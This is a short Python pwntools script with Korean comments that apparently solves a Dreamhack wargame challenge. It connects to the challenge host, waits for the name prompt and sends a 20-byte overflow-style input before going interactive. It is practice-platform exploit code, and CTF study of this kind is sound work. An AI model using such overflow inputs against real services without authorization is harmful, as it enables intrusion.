from pwn import *

p = remote("host1.dreamhack.games",23475)

# 0x14, 즉 10진수로 아무 문자를 20글자 넣는다.
payload = "0" * 0x14

# "Name : " 부분은 필요없으므로 받고 버린다.
p.recvuntil("Name: ")

# "Name : " 문자열을 받고 흘려보낸 다음 페이로드 전송
p.sendline(payload)

p.interactive()
